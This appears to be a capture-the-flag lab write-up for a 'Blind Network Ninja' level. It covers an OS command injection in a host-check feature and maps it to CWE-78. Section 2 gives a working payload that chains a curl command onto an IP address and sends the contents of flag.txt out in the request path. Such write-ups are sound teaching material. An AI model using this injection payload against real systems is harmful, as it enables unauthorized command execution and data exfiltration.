# Tier 2 — Advanced Track, Level 9: Blind Network Ninja

**Result: PASSED.** The supplied screenshot shows the command returning “Online,” followed by “MISSION ACCOMPLISHED” and “FLAG ACQUIRED.”

## 1. Result
A successful run was recorded. Earlier session notes show that the request path contained the generated flag and that submitting the run-specific value was accepted.

## 2. Exploit
Successful input shown in the screenshot:

```text
127.0.0.1 && curl http://127.0.0.1/$(cat flag.txt)
```

The shell operator `&&` chains the next command, and `$(cat flag.txt)` substitutes the file contents into the local HTTP request path. The request/log path exposes the value through an out-of-band channel. Flags can differ between runs, so the current run's output is authoritative.

## 3. Root cause
The host-check functionality appears to interpret untrusted input in a shell context, allowing shell command chaining and command substitution. The challenge's lesson panel describes out-of-band data exfiltration.

## 4. Impact & severity
**Observed impact:** challenge flag acquired through a request path. **Provisional severity: High** for a comparable production issue if an unauthenticated or low-privileged user can execute commands and exfiltrate sensitive data over network egress. Exposure and host privileges affect the final rating.

## 5. Mapping
- **CWE-78:** Improper Neutralization of Special Elements used in an OS Command (OS Command Injection).
- **OWASP Top 10 A03:2021 — Injection:** plausible high-level mapping.
Out-of-band exfiltration describes the technique and impact; it is not by itself a separate CWE.